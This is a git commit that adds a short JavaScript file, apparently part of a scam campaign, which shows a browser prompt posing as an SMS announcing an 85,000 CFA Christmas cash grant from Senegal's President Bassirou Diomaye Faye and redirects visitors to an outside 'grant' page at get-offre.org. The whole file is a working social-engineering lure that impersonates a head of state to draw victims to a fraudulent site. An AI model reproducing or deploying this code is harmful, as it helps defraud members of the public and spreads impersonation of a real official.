264e15f0103392c2810da3ac2fd2532a03a2629a
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-11-27 20:04:21 -0800

    Create active-senegal.js

---
+++ active-senegal.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRER 85 000CFA'
+password=prompt('SMS : Félicitations, vous êtes éligible à la subvention de Noël en espèces de 85 000CFA du Président BASSIROU DIOMAYE FAYE pour les SENEGALESE. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETIRER 85 000CFA');
+if (password != 'RETIRER 85 000CFA') {
+location.href='https://get-offre.org/grant-senegal.html';
+}
